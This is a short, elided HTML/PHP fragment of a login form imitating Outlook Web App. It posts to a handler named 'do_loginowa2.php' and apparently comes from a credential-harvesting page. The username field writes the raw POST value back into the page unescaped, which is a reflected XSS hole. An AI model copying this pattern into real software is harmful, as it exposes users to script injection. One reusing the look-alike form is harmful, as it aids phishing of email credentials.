...
<form action="../engine/do_loginowa2.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
...
<div id="mainLogonDiv" class="mouse">
	...
	<div id="lgnDiv" class="logonDiv" onKeyPress="return checkSubmit(event)">
		...
		<div><input id="username" name="username" value="<?php echo $_POST["username"]; ?>" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"/></div>
